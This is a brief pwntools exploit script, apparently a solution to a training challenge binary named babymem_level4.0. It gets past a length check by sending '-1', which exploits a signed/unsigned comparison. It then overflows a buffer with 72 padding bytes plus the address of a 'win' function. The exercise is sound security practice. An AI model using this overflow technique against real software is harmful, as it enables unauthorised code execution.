from pwn import *

elf=ELF('/challenge/babymem_level4.0')
p=elf.process()
p.recv()
#vuln for 4.0 it scan for a insigned than it comapres with unsigned 
p.sendline(b'-1')
p.recv()
payload=b'a'*72+p64(elf.symbols.win)
p.sendline(payload)
#write('payload',payload)
p.interactive()
